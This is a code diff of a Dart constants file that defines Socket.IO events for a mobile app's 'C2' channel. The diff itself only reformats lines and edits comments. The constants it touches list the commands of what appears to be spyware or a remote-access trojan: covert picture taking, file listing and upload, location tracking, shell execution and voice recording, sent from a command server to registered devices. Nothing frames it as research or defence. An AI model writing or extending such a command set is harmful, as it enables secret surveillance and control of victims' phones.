@@ -11,12 +11,9 @@ const String BG_SERVICE_EVENT_STOP_SERVICE = 'stopService';
 // --- Socket.IO C2 Communication Events & Commands ---
 // For C2 Registration and Heartbeat
 const String SIO_EVENT_REGISTER_DEVICE = 'register_device'; // Client to Server
-const String SIO_EVENT_REGISTRATION_SUCCESSFUL =
-    'registration_successful'; // Server to Client
-const String SIO_EVENT_DEVICE_HEARTBEAT =
-    'device_heartbeat'; // Client to Server
-const String SIO_EVENT_REQUEST_REGISTRATION_INFO =
-    'request_registration_info'; // Server to Client (if client connects without registering)
+const String SIO_EVENT_REGISTRATION_SUCCESSFUL = 'registration_successful'; // Server to Client
+const String SIO_EVENT_DEVICE_HEARTBEAT = 'device_heartbeat'; // Client to Server
+const String SIO_EVENT_REQUEST_REGISTRATION_INFO = 'request_registration_info'; // Server to Client
 
 // Commands from C2 Server to Client
 const String SIO_CMD_TAKE_PICTURE = 'command_take_picture';
@@ -24,7 +21,7 @@ const String SIO_CMD_LIST_FILES = 'command_list_files';
 const String SIO_CMD_GET_LOCATION = 'command_get_location';
 const String SIO_CMD_UPLOAD_SPECIFIC_FILE = 'command_upload_specific_file';
 const String SIO_CMD_EXECUTE_SHELL = 'command_execute_shell';
-const String SIO_CMD_RECORD_VOICE = 'command_record_voice'; // NEW: Added voice recording command
+const String SIO_CMD_RECORD_VOICE = 'command_record_voice'; // Added voice recording command
 
 // Response from Client to C2 Server
 const String SIO_EVENT_COMMAND_RESPONSE = 'command_response'; // Client to Server
